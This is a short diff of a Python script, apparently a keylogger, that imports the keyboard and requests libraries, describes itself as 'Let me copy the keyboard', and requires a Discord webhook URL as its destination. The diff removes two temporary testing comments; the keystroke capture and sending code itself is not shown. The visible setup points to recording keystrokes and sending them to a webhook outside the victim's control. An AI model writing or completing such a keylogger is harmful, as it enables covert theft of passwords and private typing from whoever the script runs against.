@@ -1,7 +1,5 @@
 import keyboard, time, requests, argparse
 from datetime import datetime, timedelta
-#!!!--------- default -a temp > remove when code done: just for testing ----------!!!
-#!!!--------- required -a temp > change when code done: just for testing ----------!!!
 def main():
     parser = argparse.ArgumentParser(description="Let me copy the keyboard")
     parser.add_argument("-a", help="Your Discord webhook URL. \nThis is required!", required=True)
